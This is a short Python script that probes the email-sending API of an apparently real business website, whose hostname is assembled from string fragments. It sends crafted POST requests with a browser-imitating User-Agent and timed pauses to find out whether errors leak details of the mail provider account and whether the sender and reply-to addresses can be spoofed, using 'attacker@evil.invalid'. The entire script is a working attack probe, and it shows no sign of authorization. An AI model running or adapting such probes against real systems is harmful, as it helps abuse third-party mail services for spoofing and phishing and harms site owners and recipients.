import requests, json, time
S = requests.Session()
S.headers.update({'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36'})
HOST = 'www.' + 'infinitycapital' + '.bh'
URL = 'https://' + HOST + '/api/send'
RCPT = 'probe@' + 'probe.local'

def post(data, tag, wait=12):
    time.sleep(wait)
    h = {'Content-Type':'application/x-www-form-urlencoded'}
    try:
        r = S.post(URL, headers=h, data=data, timeout=30, allow_redirects=False)
        print('###', tag, r.status_code)
        print(r.text[:900])
        print()
        return r
    except Exception as e:
        print('###', tag, 'ERR', type(e).__name__, str(e)[:100])

# A) minimal valid-ish: only to=  -> does it error revealing Resend account/domain?
post({'to': RCPT}, 'to-only')
# B) to + from spoof
post({'to': RCPT, 'from':'attacker@evil.invalid', 'subject':'s', 'body':'b'}, 'from-spoof')
# C) reply_to control
post({'to': RCPT, 'subject':'s', 'body':'b', 'reply_to':'attacker@evil.invalid'}, 'reply-to')
